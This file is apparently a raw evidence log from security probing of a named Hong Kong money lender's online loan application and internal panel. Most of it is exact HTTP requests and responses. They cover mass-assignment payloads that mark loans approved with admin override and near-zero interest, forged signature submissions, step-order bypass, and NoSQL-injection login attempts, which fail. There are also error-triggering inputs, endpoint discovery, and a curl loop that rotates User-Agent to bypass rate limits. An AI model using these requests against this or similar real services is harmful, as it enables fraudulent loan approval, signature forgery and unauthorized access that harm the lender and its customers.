@@ -1,0 +1,270 @@
+================================================================================
+ROYAL VENTURE GROUP - RAW EVIDENCE
+Target: online.royal-venture.com / internal.royal-venture.com
+Date: 2026-09-23
+================================================================================
+
+## Company Information (from JS bundle)
+- Company: 皇家創富集團有限公司 (Royal Venture Group Limited)
+- License: 573/2026 (Hong Kong Money Lender)
+- Address: UNIT 1207, 12/F, THE BELGIAN BANK BUILDING, NOS. 721, 723 & 725 NATHAN ROAD, KOWLOON
+- Tel: (852) 6956 8727
+- Email: info@royal-venture.com
+- Website: www.royal-venture.com
+- Case number prefix: RV
+- Apply host: online.royal-venture.com
+
+================================================================================
+1. SUBMIT — Draft Token Creation (Unauthenticated)
+================================================================================
+
+Request:
+POST /api/applications/submit HTTP/1.1
+Host: online.royal-venture.com
+Content-Type: application/json
+
+{"loan":{"amount":"100000","purpose":"整合貸款"},"personal":{"surname":"張","phone":"91234567","gender":"男"}}
+
+Response:
+HTTP/1.1 201 Created  (also seen: HTTP 200)
+Content-Type: application/json
+
+{"ok":true,"draftToken":"c482749a367776773b325835139153c970642723299ca9dd4e77925b501b6633"}
+
+Additional draft tokens obtained:
+- 4d1878d1cffa2ef3efd8a43e136aaa23f5952547ff64a966e1742577be85a2f1
+- 520995c63a6d53c045a8dff8c82d25b6962ca09d6d6698fef7814d078f1202c4
+- fc66841b141deb31bcaa24e8016645d755c8841bdd96efd2963771573b768831
+- 346968959a39eea9bb4a7f1be8f90a394877d80610ff2b98020210b98569072c
+- 0c59c0ab665c0216c7413ae97306af04a441e9591c51107b46d5b19ef8f17650
+- d2bccce359564a85508993b847ea22cd211c05cbe26123bb9a3434933dae201e
+- 5ad960cfe14730373ed82c4eb47dcd6719d1e029244dbb2ec34e76f50e0578c4
+
+All tokens are 64-character hex strings (256-bit), appear cryptographically random.
+
+================================================================================
+2. PATCH /api/applications/draft — Mass Assignment
+================================================================================
+
+Request:
+PATCH /api/applications/draft HTTP/1.1
+Host: online.royal-venture.com
+Content-Type: application/json
+
+{"token":"520995c63a6d53c045a8dff8c82d25b6962ca09d6d6698fef7814d078f1202c4","step":2,"data":{
+  "surname":"張","phone":"91234567","gender":"男",
+  "approved":true,
+  "status":"approved",
+  "adminOverride":true,
+  "isAdmin":true,
+  "role":"admin",
+  "userLevel":"superadmin",
+  "riskScore":0,
+  "riskLevel":"low",
+  "creditScore":999,
+  "approvalAmount":999999999,
+  "finalAmount":999999999,
+  "interestRate":"0.001",
+  "interestRateOverridden":true,
+  "processingFee":0,
+  "feeWaived":true,
+  "bypassCreditCheck":true,
+  "manualReview":false,
+  "reviewStatus":"approved",
+  "reviewer":"system",
+  "internalNote":"auto-approved"
+}}
+
+Response:
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"ok":true}
+
+Steps 3 and 4 also accepted with same mass assignment fields.
+
+================================================================================
+3. Step Order Bypass
+================================================================================
+
+Request: PATCH step 4 BEFORE step 2
+{"token":"<TOKEN>","step":4,"data":{"test_step_order":4,"approved":true,"status":"approved"}}
+
+Response: {"ok":true}
+
+Request: PATCH step 2 AFTER step 4
+{"token":"<TOKEN>","step":2,"data":{"test_step_order":2,"approved":true,"status":"approved"}}
+
+Response: {"ok":true}
+
+Request: PATCH step 3
+{"token":"<TOKEN>","step":3,"data":{"test_step_order":3,"approved":true,"status":"approved"}}
+
+Response: {"ok":true}
+
+Valid steps: 2, 3, 4. Step 1 is handled by submit endpoint. Step 5 is signatures.
+
+================================================================================
+4. POST /api/applications/signatures — Signature Forgery + Mass Assignment
+================================================================================
+
+Request:
+POST /api/applications/signatures HTTP/1.1
+Host: online.royal-venture.com
+Content-Type: application/json
+
+{"token":"520995c63a6d53c045a8dff8c82d25b6962ca09d6d6698fef7814d078f1202c4",
+ "fullName":"張三",
+ "hkid":"A123456(3)",
+ "sig1":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==",
+ "sig2":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==",
+ "sig3":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==",
+ "approved":true,
+ "status":"approved",
+ "adminOverride":true,
+ "reviewer":"admin",
+ "internalNote":"auto-approved-via-mass-assignment",
+ "finalAmount":999999999,
+ "interestRate":"0.001"
+}
+
+Response:
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"ok":true}
+
+Token reuse attempt after submission:
+POST /api/applications/signatures (same token)
+Response: HTTP/1.1 401 Unauthorized
+{"error":"Invalid or expired token"}
+
+================================================================================
+5. Type Confusion — Internal Server Error (DoS)
+================================================================================
+
+Request: amount as number instead of string
+{"loan":{"amount":999999999,"purpose":"test"},"personal":{"surname":"test","phone":"91234567","gender":"男"}}
+
+Response:
+HTTP/1.1 500 Internal Server Error
+{"ok":false,"error":"Internal server error"}
+
+Request: amount as array
+{"loan":{"amount":[999999999],"purpose":"test"},"personal":{"surname":"test","phone":"91234567","gender":"男"}}
+
+Response:
+HTTP/1.1 500 Internal Server Error
+{"ok":false,"error":"Internal server error"}
+
+================================================================================
+6. Unauthenticated Settings API
+================================================================================
+
+Request: GET /api/settings?key=whatsapp_phone
+Response: {"value":"85269568727"}
+
+Request: GET /api/settings (no params)
+Response: [{"key":"whatsapp_phone","value":"85269568727","label":"WhatsApp 查詢電話"}]
+
+Request: GET /api/settings?name=whatsapp_phone (any param name)
+Response: [{"key":"whatsapp_phone","value":"85269568727","label":"WhatsApp 查詢電話"}]
+
+80+ setting keys tested (admin_password, api_key, jwt_secret, db_password, etc.) — all return 404.
+SQL injection on key parameter: all payloads return 404 {"error":"Not found"} — NOT vulnerable.
+
+================================================================================
+7. Login Endpoint (internal.royal-venture.com)
+================================================================================
+
+POST /api/auth/login
+Content-Type: application/json
+
+Correct format: {"name":"...","password":"..."}
+Wrong format (username/user/pass): {"error":"請填寫姓名及密碼"} (400)
+Valid format, wrong creds: {"error":"姓名或密碼錯誤"} (401)
+Too many attempts: {"error":"登入嘗試太頻密，請 15 分鐘後再試"} (429)
+
+Rate limit: 5 attempts per 15 minutes (per IP, shared across both panels).
+
+NoSQL injection on login:
+  {"name":{"$ne":""},"password":{"$ne":""}} -> {"error":"姓名或密碼錯誤"}
+  {"name":"admin","password":{"$regex":"^.+$"}} -> {"error":"姓名或密碼錯誤"}
+Mass assignment on login:
+  {"name":"admin","password":"admin","role":"superadmin","isAdmin":true} -> {"error":"姓名或密碼錏"}
+All bypass attempts failed.
+
+================================================================================
+8. Unauthenticated Logout
+================================================================================
+
+POST /api/auth/logout (no auth)
+Response: {"ok":true}
+
+================================================================================
+9. Internal Panel Endpoints (ffuf discovery)
+================================================================================
+
+online.royal-venture.com:
+  /api/auth/login -> 405 (POST-only)
+  /api/auth/logout -> 307 -> /apply.html
+  /api/applications/draft -> 405
+  /api/applications/signatures -> 405
+  /api/applications/submit -> 405
+  /api/profile -> 307 -> /apply.html
+  /api/settings -> 200 (80 bytes, JSON)
+  /login -> 307 -> /apply.html
+  /dashboard -> 307 -> /apply.html
+
+internal.royal-venture.com:
+  /api/auth/login -> 405 (POST-only)
+  /api/auth/logout -> 405 (POST-only)
+  /api/settings -> 200 (80 bytes, JSON, unauthenticated)
+  /api/profile -> 401 {"error":"Unauthorized"}
+  /api/permissions -> 401 {"error":"Unauthorized"}
+  /api/documents -> 401 {"error":"Unauthorized"}
+  /dashboard -> 307 -> /login (requires auth)
+  /login -> 200 (login page)
+  /settings -> 307 -> /login (requires auth)
+  /profile -> 307 -> /login (requires auth)
+  /reports -> 307 -> /login (requires auth)
+
+================================================================================
+10. Token Security Tests
+================================================================================
+
+Token in query string: ?token=<TOKEN> -> {"error":"Invalid or expired token"} (token only read from body)
+Modified token (one char changed) -> {"error":"Invalid or expired token"} (IDOR blocked)
+Token as integer -> {"error":"Invalid or expired token"} (type checked)
+Token as array -> {"error":"Invalid or expired token"} (type checked)
+Token as null -> {"error":"Invalid or expired token"} (type checked)
+NoSQL injection on token: all {$ne, $gt, $regex, $exists, $type, $where, $nin} -> 401
+
+================================================================================
+11. Rate Limit Bypass via User-Agent Rotation
+================================================================================
+
+Python requests (fixed User-Agent):
+  After 3-4 requests -> HTTP 429 {"ok":false,"error":"Too many requests"}
+
+curl with different User-Agent per request:
+  for i in $(seq 1 5); do
+    curl -sk -X POST /api/applications/submit \
+      -H "User-Agent: bypass-$i" \
+      -d '{"loan":{"amount":"1000","purpose":"test"},"personal":{"surname":"test","phone":"91234567","gender":"男"}}'
+  done
+  All 5 requests succeeded (HTTP 200/201)
+
+================================================================================
+12. Form Field IDs (from inline JavaScript)
+================================================================================
+
+Step 1 (Loan Requirement): loanAmount, loanPurpose, surname, phone, gender, step1NextBtn
+Step 2 (Personal Info): dateOfBirth, address, marital, livesWith
+Step 3 (Credit Info): totalDebt, creditRows, lender, amount, months, monthlyPayment, paidMonths, applications, paymentDay
+Step 4 (Employment): occupation, companyName, companyAddress, companyPhone, employmentType, salaryMethod, tenure, monthlyIncome, hasProperty, propertyAddress, propertyDebt, propertyMonthlyPayment, propertyPurchaseDate
+Step 5 (ID Proof): fullName, hkid, sig1, sig2, sig3, sigDateDisplay
+
+================================================================================
+END OF EVIDENCE
+================================================================================
